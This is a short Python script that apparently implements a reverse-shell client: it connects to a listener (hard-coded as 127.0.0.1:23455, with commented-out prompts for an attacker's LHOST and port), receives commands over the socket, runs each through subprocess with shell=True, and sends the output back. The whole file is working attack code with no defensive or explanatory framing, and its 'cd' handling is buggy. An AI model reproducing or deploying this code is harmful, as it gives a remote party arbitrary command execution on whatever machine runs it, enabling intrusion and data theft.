from socket import *
import subprocess as sub
import os

'''
ip = input("Enter Lhost : ")
port = int(input("Enter Port : "))
'''

s = socket(2,1)
s.connect(("127.0.0.1", 23455))


while True:
     s.send((os.getcwd()+"> ").encode())
     data = (s.recv(1024)).decode()

     if data=="-":
          continue
     
     elif data[0:2]=="cd":
          try:
               s.send((os.chdir(data[3:]).encode()))
          except:
               s.send(" ".encode())
               continue


     shell_data = sub.Popen(data,shell=True,stdout=sub.PIPE,
                                            stderr=sub.PIPE,
                                            stdin=sub.PIPE)

     value = shell_data.stdout.read()+shell_data.stderr.read()
     if value == None or value == "":
          s.send("done !".encode())
          continue
     s.send(value)

s.close()
